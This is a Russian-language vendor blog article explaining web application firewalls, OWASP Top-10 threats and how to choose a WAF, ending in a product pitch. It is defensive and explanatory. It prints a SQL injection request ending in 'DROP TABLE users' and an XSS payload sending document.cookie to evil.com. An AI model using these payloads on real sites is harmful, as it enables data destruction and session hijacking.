---
title: "WAF простыми словами: что это и зачем нужен вашему сайту"
slug: waf-prostymi-slovami
description: "Что такое WAF (Web Application Firewall), от каких угроз защищает, как работает и чем отличается от обычного файрвола. Понятное руководство для бизнеса."
keywords:
  - что такое waf
  - web application firewall
  - waf простыми словами
  - waf защита сайта
  - файрвол веб-приложений
date: 2025-07-14
---

# WAF простыми словами: что это и зачем нужен вашему сайту

У вашего сайта есть сервер, на сервере стоит файрвол, порты закрыты — всё безопасно? Нет.

Обычный файрвол контролирует порты и протоколы. Он знает, что порт 443 открыт для HTTPS — и пропускает на него весь трафик. Атакующий отправляет через тот же порт 443 SQL-инъекцию, которая сливает базу клиентов. Файрвол это пропустит — для него это обычный HTTPS-запрос.

Именно эту проблему решает WAF. Он разбирает содержимое запросов и блокирует вредоносные — даже если они приходят через разрешённые порты.

## Что такое WAF

WAF (Web Application Firewall) — файрвол веб-приложений. Он анализирует HTTP/HTTPS-трафик между пользователем и веб-приложением и блокирует запросы, которые содержат попытки атак.

Обычный файрвол работает на уровне L3/L4 — IP-адреса, порты, протоколы. WAF работает на уровне L7 — анализирует URL, параметры запросов, HTTP-заголовки, тело POST-запросов, cookies.

Аналогия: обычный файрвол — охранник на входе в бизнес-центр. Проверяет пропуск — есть пропуск, проходи. WAF — это служба безопасности внутри здания, которая смотрит, что вы несёте в сумке.

## От чего защищает WAF

### SQL-инъекции (SQLi)

Атакующий вставляет SQL-код в поля ввода или URL-параметры. Если приложение не фильтрует ввод, этот код выполняется на сервере базы данных.

**Пример запроса:**
```
GET /products?id=1 OR 1=1; DROP TABLE users;--
```

Результат: база данных выполняет вредоносный запрос. Таблица users удалена. Данные клиентов потеряны.

WAF распознаёт характерные SQL-конструкции в параметрах запроса и блокирует их до того, как они дойдут до приложения.

### Cross-Site Scripting (XSS)

Атакующий внедряет JavaScript-код, который выполняется в браузерах других пользователей. Через XSS воруют сессионные cookie, перенаправляют на фишинговые сайты, подменяют контент страницы.

**Пример:**
```
POST /comment
body: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

Этот «комментарий» выполнится в браузере каждого посетителя страницы и отправит их cookie злоумышленнику.

### Атаки на загрузку файлов

Загрузка вредоносных файлов — веб-шеллов, скриптов, исполняемых файлов — через формы загрузки аватаров, документов, изображений.

### Подделка запросов (CSRF)

Выполнение действий от имени авторизованного пользователя без его ведома. Пользователь переходит по ссылке — и его браузер отправляет запрос на перевод денег или смену пароля.

### Другие угрозы

- Доступ к конфиденциальным файлам (`.env`, `.git`, бэкапы)
- Обход авторизации и аутентификации
- Атаки на десериализацию
- Server-Side Request Forgery (SSRF)
- XML External Entity (XXE)

## OWASP Top-10: главные угрозы

OWASP (Open Web Application Security Project) каждые несколько лет публикует Top-10 критических уязвимостей веб-приложений. Актуальный список (2021, обновление ожидается в 2025):

1. **Broken Access Control** — нарушение контроля доступа. Пользователь получает доступ к чужим данным или функциям администратора.
2. **Cryptographic Failures** — ошибки криптографии. Данные передаются или хранятся без шифрования.
3. **Injection** — инъекции (SQL, NoSQL, OS, LDAP). Вредоносный код выполняется через пользовательский ввод.
4. **Insecure Design** — небезопасная архитектура приложения.
5. **Security Misconfiguration** — ошибки конфигурации. Дефолтные пароли, открытые отладочные режимы.
6. **Vulnerable Components** — использование библиотек с известными уязвимостями.
7. **Authentication Failures** — ошибки аутентификации. Слабые пароли, отсутствие 2FA.
8. **Software and Data Integrity Failures** — нарушение целостности данных и ПО.
9. **Security Logging Failures** — недостаточное логирование для обнаружения атак.
10. **Server-Side Request Forgery (SSRF)** — подделка серверных запросов.

Качественный WAF защищает от 7 из 10 этих угроз — напрямую или в сочетании с правильной конфигурацией.

## Как работает WAF

WAF стоит между пользователем и веб-сервером. Каждый входящий HTTP-запрос проходит через WAF, который решает: пропустить, заблокировать или запросить дополнительную проверку.

### Сигнатурный анализ

WAF хранит базу сигнатур — известных паттернов атак. Если запрос содержит паттерн из базы, он блокируется.

**Пример сигнатуры:** Наличие `UNION SELECT` в URL-параметрах — признак SQL-инъекции.

Плюсы: быстро работает, минимум ложных срабатываний для известных атак.
Минусы: не обнаруживает новые (zero-day) атаки, требует регулярного обновления базы.

### Правила и политики

Набор условий: если запрос соответствует определённым критериям — заблокировать. Правила можно настраивать:

- Блокировать запросы с определёнными User-Agent
- Ограничить размер тела POST-запроса
- Запретить доступ к определённым URL-паттернам
- Лимитировать количество запросов за период

Популярный набор правил — OWASP Core Rule Set (CRS), включающий более 200 правил для защиты от типовых атак.

### Поведенческий анализ и Machine Learning

Современные WAF не ограничиваются сигнатурами. Они строят модель «нормального» поведения пользователей и отмечают аномалии:

- Пользователь обычно делает 5–10 запросов в минуту. Этот «пользователь» — 500 запросов в секунду → подозрительно.
- Обычные пользователи посещают 3–5 страниц за сессию. Этот за секунду запросил 200 разных URL → бот.
- Параметр `?id=` обычно содержит число. Сейчас в нём SQL-код → блокировка.

ML-модели обучаются на реальном трафике вашего сайта, что снижает ложные срабатывания и позволяет обнаруживать ранее неизвестные атаки.

### Режимы работы

WAF может работать в двух режимах:

**Blocking mode** — вредоносные запросы блокируются, пользователь получает ошибку (обычно 403 Forbidden).

**Monitoring mode** — вредоносные запросы фиксируются в логах, но не блокируются. Используется для тестирования и настройки, чтобы убедиться в отсутствии ложных срабатываний перед включением блокировки.

## WAF vs обычный файрвол

| Параметр | Файрвол (L3/L4) | WAF (L7) |
|---|---|---|
| Уровень работы | Сетевой / транспортный | Прикладной |
| Что анализирует | IP, порты, протоколы | HTTP-запросы, содержимое |
| Защищает от | Сканирования портов, несанкционированного доступа | SQL-инъекций, XSS, CSRF |
| Понимает HTTP | Нет | Да |
| Влияет на приложение | Нет — работает ниже | Да — может менять запросы и ответы |
| Типичное расположение | Периметр сети | Перед веб-сервером |

Файрвол и WAF не заменяют друг друга — они дополняют. Файрвол закрывает порты, WAF защищает то, что работает на открытых портах.

Связка ещё эффективнее, если добавить [защиту от DDoS](/anti-ddos): файрвол фильтрует L3/L4-атаки, anti-DDoS поглощает объёмные атаки, WAF защищает от L7-атак и уязвимостей приложения.

## Кому нужен WAF

### Однозначно нужен

- **E-commerce** — интернет-магазины хранят персональные данные, обрабатывают платежи. Утечка = юридические и финансовые последствия.
- **Финансовые сервисы** — банки, платёжные системы, криптобиржи. Регуляторы (ЦБ РФ, PCI DSS) требуют защиту на уровне приложений.
- **SaaS-платформы** — веб-приложения с пользовательскими данными. Уязвимость = утечка данных всех клиентов.
- **Государственные порталы** — обработка персональных данных граждан. ФЗ-152 требует обеспечения безопасности.
- **Медицинские сервисы** — данные пациентов защищены законом.

### Стоит рассмотреть

- **Корпоративные сайты** с формами обратной связи и личными кабинетами
- **Медиа и контент-платформы** — комментарии, UGC
- **API-сервисы** — любой публичный API без WAF — открытая дверь

### Можно обойтись без (пока)

- Статический лендинг без форм и серверной логики (хотя и тут WAF не помешает от парсинга и ботов)

## Как выбрать WAF

### Облачный vs On-premise

**Облачный WAF** — работает как сервис, трафик проходит через облако провайдера. Плюсы: быстрое подключение (минуты), не нужен свой сервер, масштабируется автоматически. Минусы: трафик идёт через третью сторону.

**On-premise WAF** — устанавливается на ваших серверах. Плюсы: полный контроль, трафик не покидает вашу сеть. Минусы: нужна экспертиза для настройки, дороже в обслуживании.

Для большинства компаний облачный WAF — оптимальный выбор. Он быстро подключается и не требует содержать штат специалистов по безопасности.

### На что обратить внимание

- **Поддержка OWASP CRS** — базовый набор правил должен быть включён
- **Ложные срабатывания** — WAF не должен блокировать легитимных пользователей. Спросите про показатель false positive rate.
- **Задержка (latency)** — WAF добавляет время обработки запроса. Хороший WAF — менее 1 мс.
- **Логирование и отчёты** — без логов невозможно понять, что происходит. Нужны dashboard и алерты.
- **API-защита** — если у вас есть API, WAF должен уметь работать с JSON/XML, анализировать тела запросов.
- **Поддержка WebSocket** — для современных приложений это критично.
- **Интеграция с CDN и anti-DDoS** — WAF должен быть частью комплексной защиты, а не изолированным компонентом.

### Чего избегать

- WAF, который работает только по сигнатурам без поведенческого анализа — он пропустит новые атаки
- Решения без мониторингового режима — вы не сможете настроить без риска заблокировать клиентов
- «Коробочные» решения без возможности кастомизации правил — каждое приложение уникально

## Частые ошибки при использовании WAF

**Включили и забыли.** WAF требует настройки под ваше приложение. Дефолтные правила дают базовую защиту, но для максимальной эффективности нужна доработка.

**Слишком жёсткие правила.** Если WAF блокирует 5% легитимных пользователей — вы теряете деньги. Начните с мониторингового режима, проанализируйте логи, потом включите блокировку.

**WAF как единственная защита.** WAF не заменяет безопасный код. Если в вашем приложении SQL-инъекция — нужно её исправить, а не полагаться только на WAF. Defense in depth — защита эшелонированная.

**Нет мониторинга.** WAF блокирует атаки, но вы об этом не знаете, потому что не настроили алерты. А значит, не знаете и о целенаправленных попытках взлома.

## WAF и производительность

Главное опасение: «WAF замедлит сайт». Реальность:

- Современные облачные WAF добавляют 0,5–2 мс к времени ответа
- Для пользователя это незаметно (порог восприятия — 100 мс)
- WAF может ускорить сайт, если включает кэширование или CDN
- Блокировка ботов снижает нагрузку на сервер — он работает быстрее для реальных пользователей

Если WAF добавляет больше 5 мс — стоит поискать другого провайдера.

## Подключите защиту за 24 часа — бесплатно

WAF — не роскошь для корпораций. Это стандартная часть инфраструктуры безопасности для любого веб-приложения, которое обрабатывает пользовательские данные.

AntiDDoS.su предоставляет [облачный WAF](/waf) с защитой от OWASP Top-10, поведенческим анализом и интеграцией с [анти-DDoS решением](/anti-ddos). Подключение — за 24 часа, начните с бесплатного тестового периода.

Не ждите, пока утечка данных попадёт в новости — [подключите WAF](/waf) сейчас.
